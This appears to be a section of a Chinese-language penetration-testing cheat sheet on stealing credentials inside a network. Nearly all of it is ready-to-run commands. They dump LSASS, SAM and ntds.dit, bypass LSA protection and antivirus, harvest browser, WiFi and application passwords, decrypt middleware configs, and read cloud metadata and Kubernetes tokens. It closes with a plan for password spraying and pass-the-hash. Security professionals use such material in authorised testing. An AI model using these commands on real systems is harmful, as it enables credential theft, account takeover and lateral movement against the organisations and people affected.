## 二、凭证窃取（密码是内网通行证）

> 内网渗透本质是**凭证的收集与复用**。一次抓取的明文密码/哈希可用于密码喷洒、撞库、PTH 与横向移动，价值远超单个系统权限。

### 2.1 Windows凭证窃取（mimikatz系列）
```
# 管理员/SYSTEM权限，先提权
mimikatz # privilege::debug
mimikatz # token:<REDACTED>
mimikatz # sekurlsa::logonpasswords          # 抓LSASS中登录凭据(明文+NTLM)

# Win10/2012R2+默认不存明文，开启WDigest后重启/重登可抓明文
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
**LSASS 提取（mimikatz被拦时）**：
```
# Procdump（微软官方签名，白利用）
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# comsvcs.dll（lolbin，无文件落地）
tasklist | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> dump.bin full
# 本地离线解析
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```
**注册表离线转储（无需内存操作）**：
```
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
reg save HKLM\SECURITY security.hiv
# 离线用 mimikatz lsadump::sam /sam:sam.hiv /system:system.hiv 解密本机hash
```
**域控ntds.dit（一次获取全域hash）**：
```
# ntdsutil 快照
ntdsutil snapshot "active instance ntds" create quit quit
ntdsutil snapshot "mount {GUID}" quit quit
copy C:\$SNAP_xxx\windows\ntds\ntds.dit c:\temp\ntds.dit
# vssadmin 卷影
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds.dit
# 离线解析（配合 SYSTEM hiv 解密hash）
secretsdump.py -ntds ntds.dit -system system.hiv LOCAL
```
**绕过LSASS防护（LSA Protection/PPL）**：
```
# PPLdump（签名工具绕过PPL）
PPLdump64.exe <lsass_pid> lsass.dmp
# mimikatz + mimidriver 卸载PPL保护
mimikatz "!+" "!processprotect /process:lsass.exe /remove" privilege::debug sekurlsa::logonpasswords
# NanoDump: 免杀dump lsass(绕过AV)
nanodump.exe --write /tmp/lsass.dmp
```

### 2.2 Linux凭证窃取
```
# 内存明文（需root）
./mimipenguin                                                      # Kali/Ubuntu等
# shadow破解
unshadow /etc/passwd /etc/shadow > hash.txt && john hash.txt
# 环境变量/进程参数（常含密钥）
for p in /proc/[0-9]*/environ; do strings $p 2>/dev/null | grep -iE "pass|key|secret"; done
# 全盘搜索敏感信息
grep -rn "password=" /etc /home /root /var/www /opt 2>/dev/null
find / -iname "*.conf" -o -iname "*.properties" -o -iname "*.ini" 2>/dev/null | xargs grep -ilE "pass|secret|token"
```

### 2.3 常见软件/中间件凭证（一次性批量提取）
```
# 桌面软件凭据: Navicat/TeamViewer/FileZilla/WinSCP/Xshell/Xftp
SharpDecryptPwd.exe                                          # uknowsec
# 浏览器密码/Cookie/历史
HackBrowserData.exe                                          # moonD4rk(全平台)
BrowserGhost.exe /laZagne all                                # 奇安信QAX / LaZagne
SharpChromium.exe                                            # Cookie+登录凭据
mimikatz dpapi::chrome /in:"%localappdata%\...\Login Data" /unprotect
# WiFi密码
SharpWifiGrabber.exe / netsh wlan show profiles <name> key=clear
# 向日葵(内网远控高发)
Sunflower_get_Password.exe                                   # 识别码+验证码
# MSSQL各版本密码Hash
select name,password_hash from sys.sql_logins                # 2008R2+
select name,password from master.dbo.sysxlogins              # 2000
# Oracle/MySQL/Redis等弱口令+库内密码表(为撞库铺垫)
```

### 2.4 配置文件与数据库密文解密
```
# 中间件/应用配置(内网常见)
# Tomcat:      WEB-INF/classes/{db,jdbc,config,application}.properties + conf/tomcat-users.xml
# WebLogic:    Decrypt_Weblogic_Password(密文AES解密)
# 致远OA:      /opt/Seeyon/A8/base/conf/datasourceCtp.properties
# 用友NC:      /nchome/ierp/bin/prop.xml (ncDecode)
# 泛微OA:      D:\WEAVER\ecology\WEB-INF\prop\weaver.properties
# ActiveMQ:    /apache-activemq/conf/jetty-realm.properties
# 批量搜索明文敏感信息(Windows)
findstr /i /s /m "password" *.config *.ini *.xml *.properties *.yml *.yaml
# 搜索常见密钥文件
findstr /i /s /m "BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY" C:\*
```

### 2.5 云凭证
```
# SharpCloud: 检查 AWS/Azure/GCP 本地凭证文件
SharpCloud.exe
# 云元数据(若存在SSRF或本机可访问169.254.169.254)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS
curl http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01  # Azure
# 云CLI配置
type %USERPROFILE%\.aws\credentials   ;  cat ~/.aws/credentials
# 容器/K8s：ServiceAccount Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 2.6 凭证利用优先级（决策链）
```
1. 明文密码 > NTLM哈希 > Kerberos票据 > 会话令牌
2. 抓到密码后立即做: 密码喷洒(低频) → 撞库(内网所有资产) → PTH(同口令复用)
3. 优先尝试: 域管/Domain Admin组 → 本地管理员组 → 运维账号(sa/root/administrator)
4. 工具: crackmapexec(密码喷洒) / fscan -m <protocol> -pwd <dict> / Hydra
```

